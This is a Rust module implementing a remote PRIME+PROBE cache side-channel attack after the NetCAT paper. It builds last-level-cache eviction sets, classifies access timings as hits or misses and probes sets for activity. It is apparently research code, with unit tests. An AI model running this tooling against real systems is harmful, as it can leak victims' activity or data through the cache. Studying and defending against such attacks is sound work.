//! # Remote PRIME+PROBE
//! This module is responsible for implementing PRIME+PROBE method of cache activity tracking.
//! The method is described in _NetCAT: Practical Cache Attacks from the Network_.

pub mod params;
mod timing_classif;

use crate::connection::{Address, CacheConnector, Time};
use console::style;
pub use params::*;
use rand::seq::SliceRandom;
use serde::{Deserialize, Serialize};
use std::io::Result;
use std::io::{Error, ErrorKind};
use timing_classif::{CacheTiming, TimingClassifier};

const TIMINGS_INIT_FILL: usize = 150;
const TIMING_REFRESH_FILL: usize = 50;
const RETRY_CNT: usize = 10;
const CTL_BIT: usize = 6; // 6 - 12 (lower bits - lower val)

pub type Contents = u8;

#[macro_export]
macro_rules! median {
    ($blk:block) => {{
        const STABILIZE_CNT: usize = 10;
        let mut vec = Vec::with_capacity(STABILIZE_CNT);
        for _ in 0..STABILIZE_CNT {
            vec.push($blk);
        }
        vec.sort();
        vec[(vec.len() - 1) / 2]
    }};
}

/// # EvictionSet
/// EvictionSet
pub type EvictionSet = Vec<Address>;

/// A custom code, representing one page color
pub type ColorCode = usize;

/// A custom code, representing one page color
pub type ColoredSetCode = usize;

#[derive(Copy, Clone, Default, Debug, PartialOrd, PartialEq, Eq, Ord, Serialize, Deserialize)]
pub struct SetCode(pub ColorCode, pub ColoredSetCode);

type EvictionSets = Vec<EvictionSet>;
// a mapping from the color code to the eviction sets, corresponding to this color
// when we find a new set, consisting of page aligned addresses starting at the beginning of the page
// we get 64 more sets, which will be of the same color as we change only bits from 6 to 12, which are
// for page offset
type ColoredSets = Vec<EvictionSets>;

/// Probe results with wraped data
// NOTE maybe downgrade to Option??
#[derive(Clone, Debug, PartialOrd, PartialEq, Eq, Ord, Serialize, Deserialize)]
pub enum ProbeResult<T> {
    Activated(T),
    Stale(T),
}

impl<T> ProbeResult<T> {
    pub fn is_activated(&self) -> bool {
        if let ProbeResult::Activated(_) = self {
            return true;
        }

        false
    }

    pub fn is_stale(&self) -> bool {
        !self.is_activated()
    }
}

pub type Latencies = Vec<Time>;

/// # RPP
/// Contains the context of the RPP for a given connection.
pub struct Rpp<C> {
    params: RppParams,
    conn: C,
    colored_sets: ColoredSets,    // maps a color code to sets
    addrs: Vec<Vec<Address>>, // adress pools for each of the values of bits 12-6 of virtual addresses
    classifier: TimingClassifier, // we will be using this to dynamically scale threshold
    quite: bool,
}

impl<C: CacheConnector<Item = Contents>> Rpp<C> {
    /// Creates a new instance with the default params.
    /// `quite` tells, whether the progress should be reported on the screen
    pub fn new(conn: C, quite: bool) -> Rpp<C> {
        let params: CacheParams = Default::default();
        Self::with_params(conn, quite, params)
    }

    /// Creates a new instance with the provided params and starts building eviction sets
    /// `quite` tells, whether the progress should be reported on the screen
    pub fn with_params(conn: C, quite: bool, cparams: CacheParams) -> Rpp<C> {
        let classifier = TimingClassifier::new();
        let params: RppParams = cparams.into();

        // Fill in the address table (64 values of bits 12-6)
        let mut addrs = Vec::with_capacity(64);
        for i in 0..64 {
            addrs.push(
                (0usize..params.v_buf / PAGE_SIZE)
                    .map(|x| (x * PAGE_SIZE) ^ (i << 6))
                    .collect(),
            );
        }

        let mut rpp = Rpp {
            colored_sets: ColoredSets::with_capacity(params.n_colors),
            conn,
            addrs, // here we collect page aligned (e.i. at the begining of the page) addresses
            classifier,
            quite,
            params,
        };
        rpp.build_sets();

        rpp
    }

    /// Primes the given set of addresses
    pub fn prime(&mut self, set_code: &SetCode) -> Result<()> {
        self.conn
            .cache_all(self.colored_sets[set_code.0][set_code.1].iter().copied())
    }

    /// Probes the given set of addresses. Returns true if a set activation detected
    /// Returns `Activated(lats)`, where `lats` is a vector of latencies for addresses in
    /// the given set, if the cache activation has been measured, or `Stale(lats)` otherwise
    pub fn probe(&mut self, set_code: &SetCode) -> Result<ProbeResult<Latencies>> {
        use ProbeResult::*;

        let set: Vec<usize> = self.colored_sets[set_code.0][set_code.1]
            .iter()
            .copied()
            .collect();
        let lats = set
            .into_iter()
            .map(|x| self.conn.time_access(x))
            .collect::<Result<Vec<Time>>>()?;

        let miss = lats.iter().find(|&&lat| self.classifier.is_miss(lat));

        // We test whether an activation
        if miss.is_some() {
            return Ok(Activated(lats));
        }

        Ok(Stale(lats))
    }

    /// Primes all sets in a vector
    pub fn prime_all(&mut self, set_codes: &[SetCode]) -> Result<()> {
        set_codes.iter().map(|x| self.prime(x)).collect()
    }

    /// Probes all sets in a vector
    pub fn probe_all(&mut self, set_codes: &[SetCode]) -> Result<Vec<ProbeResult<Latencies>>> {
        set_codes.iter().map(|x| self.probe(x)).collect()
    }

    fn train_classifier(&mut self, sampls_num: usize) {
        // we assume that the memory region is not cached
        let mut rng = rand::thread_rng();

        for &ofs in self.addrs[0]
            .as_slice()
            .choose_multiple(&mut rng, sampls_num)
        {
            // here we read from the main memory
            let miss_time = self
                .conn
                .time_access(ofs)
                .expect("Failed to time memory access");

            // here we cache the address and read again from cache
            self.conn
                .cache(ofs)
                .expect("Failed to cache addr in while training");
            let hit_time = self
                .conn
                .time_access(ofs)
                .expect("Failed to time cache access");

            // we expect the latency from main memory to be bigger that from LLC
            if hit_time < miss_time {
                self.classifier.record(CacheTiming::Hit(hit_time));
                self.classifier.record(CacheTiming::Miss(miss_time));
            }
        }
    }

    fn build_sets(&mut self) {
        let ok = style("OK").green().to_string();
        // We will have to profile this much pages. Only so many fit into the cache
        let pages_to_profile = self.params.n_colors;

        if !self.quite {
            eprintln!("Building sets: {}", style("STARTED").green())
        }
        self.conn.reserve(self.params.v_buf);
        self.train_classifier(TIMINGS_INIT_FILL);

        let pb = indicatif::ProgressBar::new(pages_to_profile as u64);

        if !self.quite {
            pb.set_style(
                indicatif::ProgressStyle::default_bar()
                    .template("({elapsed}:{eta}) [{bar:40.cyan/blue}] {percent}% {msg}")
                    .progress_chars("#>-"),
            );
            pb.set_message(&ok);
        }

        while self.colored_sets.len() < pages_to_profile {
            match self.build_initial_set() {
                Ok(set) => {
                    let mut err_cnt = 0;
                    while let Err(e) = self.add_sets(&set) {
                        err_cnt += 1;
                        pb.set_message(style(e).red().to_string().as_str());
                        if err_cnt > RETRY_CNT {
                            panic!("{}", style("Failed to derive sets").red());
                        }
                    }
                    if !self.quite {
                        pb.inc(1);
                        pb.set_message(&ok);
                    }
                }
                Err(e) => {
                    if !self.quite {
                        match e.kind() {
                            ErrorKind::UnexpectedEof => panic!("{}", style(e).red()),
                            ErrorKind::InvalidInput => (),
                            _ => pb.set_message(style(e).red().to_string().as_str()),
                        }
                    }
                }
            }

            // stop training if the num of addrs is too small
            if self.addrs.len() > 500 {
                self.train_classifier(TIMING_REFRESH_FILL);
            }
        }

        if !self.quite {
            pb.finish_with_message(style("FINISHED").green().to_string().as_str());
        }
    }

    /// Checks, whether the given set evicts an address
    fn check_evicts<I: Iterator<Item = Address>>(&mut self, set: I, addr: Address) -> Result<bool> {
        // bring `addr` into cache
        self.conn.cache(addr)?;

        // bring addrs from the `set` into cache, which shold cause eviction of addr
        self.conn.cache_all(set)?;

        // time access to `addr`
        let lat = self.conn.time_access(addr)?;

        // it should be a miss
        if self.classifier.is_miss(lat) {
            return Ok(true);
        }

        Ok(false)
    }

    fn build_initial_set(&mut self) -> Result<EvictionSet> {
        let addr = *self.addrs[0]
            .choose(&mut rand::thread_rng())
            .ok_or_else(|| Error::new(ErrorKind::UnexpectedEof, "ERROR: No addrs left"))?;
        let set = self.build_set_for_idx_addr(0, addr)?;
        self.cleanup_congruent(&set, 0)?;
        Ok(set)
    }

    // this step might fails only due to read & write fails. read and write fail only as the last resort
    fn build_set_for_idx_addr(&mut self, idx: usize, addr: Address) -> Result<EvictionSet> {
        let mut s = self.forward_selection(idx, addr)?;
        self.backward_selection(&mut s, addr)?;
        self.remove_used_addrs(&s, idx);

        Ok(s)
    }

    /// Adds the given set and derived set for the same color (page)
    #[cfg(not(feature = "xor_slice_hash"))]
    fn add_sets(&mut self, set: &[Address]) -> Result<()> {
        const NUM_VARIANTS: usize = 64; // bits 12 - 6 determine the cache set. We have 2^6 = 64 options to change those

        // this vector corresponds to the new color which we have profiled
        // one color corresponds to as much sets as there are on one page
        // other sets for pages with the same color will not pass the uniqueness check
        let mut sets = Vec::with_capacity(self.params.n_sets_per_page);
        sets.push(set.to_vec());

        for i in 1..NUM_VARIANTS {
            for addr in set.iter().copied().map(|x| x ^ (i << CTL_BIT)) {
                let new_set = match self.build_set_for_idx_addr(i, addr) {
                    Ok(set) => set,
                    Err(_) => continue,
                };
                sets.push(new_set);
                break;
            }
            if sets.len() != i + 1 {
                return Err(Error::new(
                    ErrorKind::NotFound,
                    "Error: could not derive sets",
                ));
            }
        }

        // Finally, we record a new color
        self.colored_sets.push(sets);

        Ok(())
    }

    /// Adds the given set and derived set for the same color (page)
    #[cfg(feature = "xor_slice_hash")]
    fn add_sets(&mut self, set: EvictionSet) -> Result<()> {
        const NUM_VARIANTS: usize = 64; // bits 12 - 6 determine the cache set. We have 2^6 = 64 options to change those

        // this vector corresponds to the new color which we have profiled
        // one color corresponds to as much sets as there are on one page
        // other sets for pages with the same color will not pass the uniqueness check
        let mut sets = Vec::with_capacity(self.params.n_sets_per_page);
        sets.push(set.clone());
        for i in 1..NUM_VARIANTS {
            // We construct 64 new sets given one
            let new_set = set.iter().copied().map(|x| x ^ (i << CTL_BIT)).collect(); // xor all options with addrs from the given set
            sets.push(new_set);
        }

        // Finally, we record a new color
        self.colored_sets.push(sets);

        Ok(())
    }

    /// Check whether a given set with is unique
    /// Will test it against all other sets with different colors
    /// **and addresses with bits 6-12 equal to addrs from the given set**. This is
    /// the nessessary condition for them to interfere with each other.
    fn is_unique(&mut self, set: &[Address]) -> Result<bool> {
        const REPEATING: usize = 5; // We will try for multiple times,
                                    // taking the most probable result
        let mut test_addrs = [0; REPEATING];

        // Extract idx for the given set
        let idx = set
            .iter()
            .next()
            .ok_or_else(|| Error::new(ErrorKind::InvalidInput, "Eviction set is empty"))?
            & (0b111111 << CTL_BIT);

        // We need to check sets from vector inside `colored_sets` vector with the
        // given `idx`
        let colors = self.colored_sets.len();

        for color in 0..colors {
            let mut score = 0; // the more - the better
            let other_set = &self.colored_sets[color][idx];
            // Taking random testing addrs from the other set
            for test_addr in &mut test_addrs {
                *test_addr = *other_set
                    .as_slice()
                    .choose(&mut rand::thread_rng())
                    .unwrap();
            }

            for &test_addr in &test_addrs {
                // If evicts then the new set is not unique, it falls into the same cache set
                if self.check_evicts(set.iter().copied(), test_addr)? {
                    score -= 1;
                } else {
                    score += 1;
                }
            }

            // We consider the most probable result to be true
            if score <= 0 {
                return Ok(false);
            }
        }

        Ok(true)
    }

    fn forward_selection(&mut self, idx: usize, addr: Address) -> Result<EvictionSet> {
        let total_addrs = self.addrs[idx].len();

        if total_addrs < self.params.n_lines + 1 {
            return Err(Error::new(ErrorKind::UnexpectedEof, "ERROR: No addrs left"));
        }
        let mut n = std::cmp::max(total_addrs / 10, self.params.n_lines + 1);

        while n <= total_addrs {
            let sub_set: Vec<Address> = self.addrs[idx][..n - 1].to_vec();

            if self.check_evicts(sub_set.iter().copied(), addr)? {
                return Ok(sub_set);
            }

            n += 1;
        }

        // Here we excided the number of addrs, but registered no eviction
        // We remove the faulty address not to cause more issues
        Err(Error::new(
            ErrorKind::Other,
            "ERROR: cannot build set for the chosen address.",
        ))
    }

    // Here we assume that set `s` truly evicts address `x`
    // here we use the approach proposed by Vila et al.
    fn backward_selection(&mut self, s: &mut EvictionSet, x: Address) -> Result<()> {
        if s.len() < self.params.n_lines {
            return Err(Error::new(
                ErrorKind::Other,
                "ERROR: the initial set for backwards selection is too narrow.",
            ));
        }
        if s.len() == self.params.n_lines {
            return Ok(());
        }

        while s.len() > self.params.n_lines {
            // we need n_lines + 1 chuncks
            let chunk_len = s.len() / (self.params.n_lines + 1);
            let mut idx = 0;
            let mut fnd = false;

            // check, whether throwing out one of first `n_lines` chunks
            // does not effect eviction
            for _ in 0..self.params.n_lines {
                let it = s[..idx].iter().chain(s[idx + chunk_len..].iter()).copied();

                // check, whether we evict x without a selected chunk
                if self.check_evicts(it, x)? {
                    // we still evicted x => we do not need this chunk
                    fnd = true;
                    break;
                }

                idx += chunk_len;
            }

            if fnd {
                // remove chunk with no useful data
                s.drain(idx..idx + chunk_len);
            } else {
                // remove tailing chunk
                s.drain(idx..);
            }
        }

        Ok(())
    }

    #[inline(always)]
    fn cleanup_full(&mut self, s: &[Address], idx: usize) -> Result<()> {
        self.remove_used_addrs(s, idx);
        self.cleanup_congruent(s, idx)
    }

    #[inline(always)]
    fn remove_used_addrs(&mut self, s: &[Address], idx: usize) {
        // Remove addrs in set `S` from global addr pool
        self.addrs[idx].retain(|x| !s.contains(x));
    }

    fn cleanup_congruent(&mut self, s: &[Address], idx: usize) -> Result<()> {
        // We will be iterating over the set and removing from it. Rust does not allow that, thus making a copy
        let addrs: Vec<usize> = self.addrs[idx].clone();

        // We will have to manually update index to take removed values into account.
        let mut i = 0;
        for x in addrs {
            // If `x` is evicted by our new cache set, then we do not need it anymore
            if self.check_evicts(s.iter().copied(), x)? {
                // Remove value at index. We do not need to update `i` as the next val will have the same
                // index as we removed the current.
                self.addrs[idx].remove(i);
            } else {
                i += 1;
            }
        }

        Ok(())
    }

    // -------------------------METHODS FOR ONLINE TRACKER---------------------

    /// Returns the number of profiled colors
    pub fn colors_len(&self) -> usize {
        self.colored_sets.len()
    }

    /// Returns an iterator over all profiled `ColorCode`s
    pub fn colors<'a>(&'a self) -> impl Iterator<Item = ColorCode> + 'a {
        self.colored_sets.iter().enumerate().map(|(i, _)| i)
    }

    /// Returns the number of eviction sets, profiled for the given color
    pub fn color_len(&self, color_code: ColorCode) -> usize {
        self.colored_sets[color_code].len()
    }

    /// Return an iterator over `ColoredSetCodes` for the given color
    pub fn iter_color<'a>(
        &'a self,
        color_code: ColorCode,
    ) -> impl Iterator<Item = ColoredSetCode> + 'a {
        0..self.colored_sets[color_code].len()
    }
    /// Returns an iterator over all proviled `SetCode`s
    pub fn iter<'a>(&'a self) -> impl Iterator<Item = SetCode> + 'a {
        self.colored_sets
            .iter()
            .enumerate()
            .flat_map(|(color_code, v)| {
                v.iter()
                    .enumerate()
                    .map(move |(set_code, _)| SetCode(color_code, set_code))
            })
    }
}

/// Test whether an activation has been observed in the provided Probe Results
#[inline(always)]
pub fn has_activation<T>(probes: &[ProbeResult<T>]) -> bool {
    probes.iter().any(ProbeResult::is_activated)
}

#[cfg(test)]
mod tests {
    #[test]
    fn new_rpp_test() {
        let conn = crate::connection::local::LocalMemoryConnector::new();
        super::Rpp::new(conn, false);
    }

    #[test]
    fn macro_test() {
        let med = median! {
            {
                1
            }
        };
        assert_eq!(1, med, "Median from const failed");

        let v = vec![1, 2, 4, 5, 6, 324, 22, 3, 10, 13]; // 1, 2, 3, 4, 5, 6, 10, 13, 22, 324
        let mut it = v.into_iter();

        let med = median! {{
            it.next().unwrap()
        }};
        assert_eq!(5, med, "Median from even iter failed");

        let v = vec![1, 2, 4, 5, 6, 324, 22, 3, 10, 13, 0];
        let mut it = v.into_iter();

        let med = median! {{
            it.next().unwrap()
        }};
        assert_eq!(5, med, "Median from odd iter failed");
    }
}
